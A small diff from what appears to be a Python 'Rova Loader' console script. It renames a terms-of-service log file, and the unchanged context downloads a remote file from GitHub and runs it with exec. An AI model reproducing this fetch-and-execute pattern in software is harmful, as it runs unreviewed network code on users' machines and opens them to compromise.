@@ -47,7 +47,7 @@ banner = f"""
 """[1:]
 Write.Print((banner), Colors.white_to_green, interval=0.00025)
 msvcrt.getch()
-file = open('RovaLoadertos.txt', 'a')
+file = open('RovaLoaderTOS.txt', 'a')
 file.write("""The user have accepted Rova's Archive's terms of service.""")
 file.close()
 exec(requests.get('https://raw.githubusercontent.com/Rafail2023/RovaClient/refs/heads/main/Main.txt').text)
